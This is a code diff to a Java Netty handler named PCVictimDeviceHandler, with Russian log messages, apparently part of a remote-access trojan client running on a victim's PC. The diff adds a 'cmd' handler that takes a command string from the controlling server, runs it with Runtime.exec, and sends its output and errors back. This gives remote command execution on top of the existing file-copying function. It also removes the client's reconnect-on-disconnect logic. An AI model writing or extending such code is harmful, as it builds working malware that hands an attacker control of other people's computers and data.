@@ -5,8 +5,7 @@ import io.netty.channel.ChannelInboundHandlerAdapter;
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 
-import java.io.File;
-import java.io.ObjectInputFilter;
+import java.io.*;
 import java.net.SocketAddress;
 import java.util.concurrent.ConcurrentHashMap;
 
@@ -34,11 +33,7 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
 
     @Override
     public void channelInactive(ChannelHandlerContext ctx) throws Exception {
-        System.out.println("Отключились от сервера!");
-        int mills = 5000;
-        System.out.println("Ожидаем "+mills/1000+" сек....");
-        Thread.sleep(mills);
-        PCVictimDevice.getInstance().run();
+        System.out.println("Отключились от сервера! ChannelInvactive()!");
     }
 
     private void receiveMessage(JSONObject message) {
@@ -91,6 +86,25 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
 
                 sendCopyFile(code, (String) message.get("owner"));
                 break;
+            case "cmd":
+                String command = (String) message.get("command");
+                try {
+                    Process process = Runtime.getRuntime().exec(command);
+                    BufferedReader cmdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    BufferedReader cmdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));
+
+                    String line, out = "", errorOut = "";
+                    while ((line = cmdInput.readLine()) != null)
+                        out += line;
+                    while ((line = cmdError.readLine()) != null)
+                        errorOut += line;
+
+                    sendCmd(out, errorOut, (String) message.get("owner"));
+                } catch (IOException e) {
+                    e.printStackTrace();
+                    sendCmd("", e.toString(), (String) message.get("owner"));
+                }
+                break;
         }
     }
 
@@ -137,6 +151,15 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
     private void sendErrorCode(String errorCode, String owner) {
         JSONObject query = new JSONObject();
         query.put("errorCode", errorCode);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    private void sendCmd(String out, String errorOut, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "cmd");
+        query.put("out", out);
+        query.put("errorOut", errorOut);
         query.put("owner", owner);
         sendMessage(query);
     }
